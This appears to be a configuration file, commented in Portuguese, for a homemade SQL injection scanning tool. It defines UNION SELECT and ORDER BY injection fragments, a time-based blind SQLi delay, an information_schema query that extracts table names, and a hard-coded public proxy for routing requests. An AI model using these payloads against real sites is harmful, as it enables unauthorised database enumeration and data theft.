#variaveis e Constantes


from http.client import REQUEST_TIMEOUT


ACTION_VALIDATE  = False
REQUEST_TIMEOUT  = 10
INPUTS_NUBERS = 0
TARGET_VULNERABLE = False
INITIAL_FORM_COUNT_VALUE = 1
INITIAL_COUNT_VALUE = 0
AVARAGE_TIME_BASED_SQLI = 0.99 ## uma conexão é estável quando somente e somente se não houver perdas de pacotes e o valor do jiiter for zero ou próximo de zero (https://codepre.com/pt/como-medir-la-estabilidad-de-su-conexion-a-internet-desde-su-pc.html)

## default time delay for sqli blind time-based 
DEFAULT_SQLI_TIME_BASED_TIME = 5
## counter for succed sqli bind time-based 
SQLI_BLIND_TIME_BASED_SUCCED_COUNT = 0


HEADERS = {  # default headers
    'User-Agent': '$',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip,deflate',
    'Connection': 'close',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1',
    }

PROXIES_ = {'http': 'http://217.219.61.6:8080', 'https': 'https://217.219.61.6:8080'}#  Fonte de servidor proxy usado configurado  https://spys.one/en/


FIND_NUMBER_OF_COLLUM_IN_TABLE = '+ORDER+BY+' # aqui vai acrescentando a quanntidade de ordenação e validar
VULNERABLE_COLLUM_DETECTING = "+UNION+SELECT+" 
CHECKING_FOR_DBMS_VERSION = "version()";
GET_TABLES_NAMES = "(SELECT+group_concat(table_name)+from+information_schema.tables+where+table_schema=database())" 


OS = ['ubuntu', 'kali', 'windows', 'macos', 'oracle solaris', 'fedora','susi', 'red hat' ]
MYSQL_SERVER_VERSIONS = ['8.0.28', '8.0.22', '8.0.30', '8.0.29', '8.0.27', '8.0.26', '8.0.25', '8.0.21' ]